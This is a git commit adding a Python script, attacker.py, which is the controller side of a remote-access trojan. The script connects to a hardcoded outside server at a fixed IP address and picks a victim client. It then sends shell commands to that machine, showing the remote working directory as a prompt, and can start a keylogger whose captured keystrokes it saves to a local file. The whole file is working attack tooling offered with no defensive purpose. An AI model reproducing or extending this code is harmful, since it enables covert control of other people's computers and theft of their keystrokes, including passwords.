e55fad6ef63ecd67ddbd989b0e26ddd9d4cd93f4
3Bixx.py <86367345+3BixxPy@users.noreply.github.com>
2022-04-05 22:06:33 +0200

    Create attacker.py

---
+++ attacker.py
@@ -0,0 +1,61 @@
+import socket
+
+HEADER = 1024
+PORT = 65459
+FORMAT = 'utf-8'
+DISCONNECT_MESSAGE = "!DISCONNECT"
+SERVER = "90.64.0.146"
+ADDR = (SERVER, PORT)
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(ADDR)
+
+
+def append_new_line(text_to_append):
+    with open("kl.txt", "a+") as file_object:
+        file_object.seek(0)
+        data = file_object.read(10)
+        if len(data) > 0:
+            file_object.write("\n")
+        file_object.write(text_to_append)
+
+
+def send(msg):
+    message = msg.encode(FORMAT)
+    client.send(message)
+
+
+def recieve():
+    klactive = False
+    while True:
+        mes = (client.recv(1024))
+        if mes:
+            recieved = mes.decode(FORMAT)
+            if "<sep>" in recieved:
+                cwd, output = recieved.split("<sep>")
+                print("output: " + output)
+                if not klactive:
+                    sendinput = input(cwd + "$>")
+                    if sendinput:
+                        if sendinput == "kl":
+                            klactive = True
+                        send(sendinput)
+                    if not sendinput:
+                        send(" ")
+            if "<kl>" in recieved:
+                append_new_line(recieved.strip("<kl>"))
+                print(recieved.strip("<kl>"))
+
+
+selectclient = input("select client: ")
+# ATTACKET:CLIENT1
+send("ATTACKER:" + str(selectclient))
+while True:
+    send("cd")
+    mes1 = (client.recv(HEADER))
+    mess = mes1.decode(FORMAT)
+    if mess:
+        break
+
+send("cd")
+recieve()
